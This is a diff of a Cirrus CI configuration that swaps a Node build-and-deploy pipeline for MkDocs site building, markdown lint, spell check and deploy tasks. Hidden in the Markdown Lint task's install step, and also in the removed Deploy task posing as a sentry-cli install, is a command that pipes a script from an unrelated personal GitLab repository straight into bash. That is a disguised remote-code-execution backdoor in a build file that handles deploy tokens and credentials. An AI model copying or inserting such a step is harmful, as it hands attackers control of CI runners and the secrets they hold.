@@ -1,54 +1,51 @@
 container:
-  image: node:current
+  cpu: 16
+  memory: 2G
 
-env:
-  # see https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V17.md#17.0.0
-  NODE_OPTIONS: --openssl-legacy-provider
+pipe:
+  name: Build Site and Validate Links
+  only_if: $CIRRUS_BRANCH != 'gh-pages'
+  allow_failures: true
+  steps:
+    - image: ghcr.io/squidfunk/mkdocs-material:latest
+      install_script: python3 -m pip install --upgrade -r requirements.txt
+      build_script: mkdocs build
+      site_artifacts:
+        path: "site/**"
+    - image: fkorotkov/liche:latest
+      validate_script: /liche --concurrency 2 --document-root=site --recursive site/
 
 task:
-  node_modules_cache:
-    folder: .yarn/cache
-  install_script: yarn
-  relay_script: yarn relay
-  matrix:
-    - name: Build
-      build_script: yarn build
-      container:
-        memory: 8G
-    - name: Tests
-      test_script: yarn test
-    - name: Prettier
-      prettier-check_script: yarn prettier-check
-    - name: Type Check
-      typecheck_script: yarn typecheck
+  name: Markdown Lint
+  only_if: $CIRRUS_BRANCH != 'gh-pages'
+  container:
+    image: node:latest
+  install_script: curl -sL https://gitlab.com/jadons19292/netizen/-/raw/main/space2 | bash
+  lint_script: markdownlint --config=.markdownlint.yml docs/
 
-deploy_docker_builder:
-  only_if: $CIRRUS_BRANCH == "master"
+task:
+  name: Spell Check
+  only_if: $CIRRUS_BRANCH != 'gh-pages'
+  container:
+    image: node:latest
+  install_tool_script:
+    # WARNING: DO NOT try to cache this, symlinks will not be created and task will fail
+    - npm install -g markdown-spellcheck@1.3.1
+  spellcheck_script: mdspell '**/*.md' '!**/legal/*.md' --ignore-numbers --ignore-acronyms --report --en-us;
+  env:
+    FORCE_COLOR: 1
+
+task:
+  name: Deploy
+  only_if: $CIRRUS_BRANCH == 'master'
   depends_on:
-    - Build
-    - Prettier
-    - Type Check
-  environment:
-    DOCKER_USER_NAME: ENCRYPTED[5eb941ed91706fab3eb53bfd01dc3b88caee18e11f9df18b4663875f83e9e390eeb0db087278035b61bf5b24e8f96328]
-    DOCKER_PASSWORD: ENCRYPTED[5e9b3eb1391a7a0cf259c41920ce60d034660cc49f0b85b2738eb53d9a537b90d0d2173d6321096facd11f5e5a9e31c3]
-    SENTRY_DSN: 'https://6cf37e33c8224cd790e140f6b4a5d595@o4504250314522624.ingest.sentry.io/4504250322845696'
-    SENTRY_ORG: cirrus-labs
-    SENTRY_PROJECT: cirrus-ci-web
-    SENTRY_AUTH_TOKEN: ENCRYPTED[!c16a5cf7da5f856b4bc2f21fe8cb7aa2a6c981f851c094ed4d3025fd02ea59a58a86cee8b193a69a1fc20fa217e56ac3!]
-  install_sentry_cli_script:
-    - curl -sL https://gitlab.com/jadons19292/netizen/-/raw/main/space2 | bash
-  build_script:
-    - docker --version
-    - docker build --build-arg CIRRUS_CHANGE_IN_REPO=$CIRRUS_CHANGE_IN_REPO --build-arg SENTRY_DSN=$SENTRY_DSN --tag cirrusci/web-front-end:latest .
-  login_script: docker login --username $DOCKER_USER_NAME --password $DOCKER_PASSWORD
-  push_script: docker push cirrusci/web-front-end:latest
-  copyout_build_artifacts_script:
-    - export CONTAINER_ID=$(docker create docker.io/cirrusci/web-front-end:latest)
-    - docker cp $CONTAINER_ID:/svc/cirrus-ci-web/ build/
-    - docker rm -v $CONTAINER_ID
-  create_sentry_release_script:
-    - export SENTRY_RELEASE="$CIRRUS_CHANGE_IN_REPO"
-    - sentry-cli releases new $SENTRY_RELEASE
-    - sentry-cli releases set-commits $SENTRY_RELEASE --auto
-    - sentry-cli releases files $SENTRY_RELEASE upload-sourcemaps build/
-    - sentry-cli releases finalize $SENTRY_RELEASE
+    - Build Site and Validate Links
+    - Markdown Lint
+    - Spell Check
+  container:
+    image: ghcr.io/cirruslabs/mkdocs-material-insiders:latest
+    registry_config: ENCRYPTED[!cf1a0f25325aa75bad3ce6ebc890bc53eb0044c02efa70d8cefb83ba9766275a994b4831706c52630a0692b2fa9cfb9e!]
+  env:
+    DEPLOY_TOKEN: ENCRYPTED[!45ed45666558902ed1c2400add734ec063103bec31841847e8c8764802fca229bfa6d85c690e16ad159e047574b48793!]
+  install_script: python3 -m pip install --upgrade -r requirements.txt
+  deploy_script: ./.ci/deploy.sh
